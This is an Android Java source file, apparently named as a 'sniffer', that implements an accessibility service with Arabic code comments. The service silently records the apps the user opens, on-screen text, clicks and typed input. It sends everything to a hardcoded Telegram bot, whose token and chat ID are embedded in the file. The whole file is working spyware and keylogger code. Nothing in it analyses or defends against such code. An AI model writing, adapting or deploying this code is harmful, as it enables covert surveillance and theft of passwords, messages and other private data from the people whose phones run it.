package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AccessibilityMonitorService extends AccessibilityService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private StringBuilder currentScreenText = new StringBuilder();
    private String lastPackage = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
            
            // عندما يتغير التطبيق
            if (!packageName.equals(lastPackage)) {
                lastPackage = packageName;
                sendToTelegram("📱 **Opened App:** " + packageName);
                currentScreenText = new StringBuilder();
            }
            
            // قراءة النص من الشاشة
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String nodeText = getNodeText(source);
                if (nodeText != null && !nodeText.isEmpty()) {
                    currentScreenText.append(nodeText).append("\n");
                    
                    // إرسال النص إذا كان طويلاً
                    if (currentScreenText.length() > 100) {
                        sendToTelegram("📝 **Screen Content:**\n" + currentScreenText.toString());
                        currentScreenText = new StringBuilder();
                    }
                }
                source.recycle();
            }
            
            // إرسال عند النقر على شيء
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo clickedNode = event.getSource();
                if (clickedNode != null && clickedNode.getText() != null) {
                    sendToTelegram("👆 **Clicked:** " + clickedNode.getText());
                    clickedNode.recycle();
                }
            }
            
            // إرسال عند تغيير النص (كتابة)
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                if (event.getText() != null && event.getText().size() > 0) {
                    sendToTelegram("✍️ **Typing:** " + event.getText().get(0));
                }
            }
            
            // إرسال عند فتح نافذة جديدة
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (event.getClassName() != null) {
                    sendToTelegram("🪟 **Window:** " + event.getClassName());
                }
            }
            
        } catch (Exception e) {
            sendToTelegram("❌ Accessibility Error: " + e.getMessage());
        }
    }
    
    private String getNodeText(AccessibilityNodeInfo node) {
        try {
            StringBuilder text = new StringBuilder();
            if (node.getText() != null) {
                text.append(node.getText());
            }
            
            // البحث عن النصوص في الأطفال
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    String childText = getNodeText(child);
                    if (childText != null && !childText.isEmpty()) {
                        text.append("\n").append(childText);
                    }
                    child.recycle();
                }
            }
            return text.toString();
        } catch (Exception e) {
            return "";
        }
    }

    @Override
    public void onInterrupt() {
        sendToTelegram("⚠️ Accessibility Service Interrupted");
    }
    
    @Override
    public void onServiceConnected() {
        sendToTelegram("✅ **Screen Monitor Active** - Tracking all screen activity");
    }
    
    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", text)
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }
}
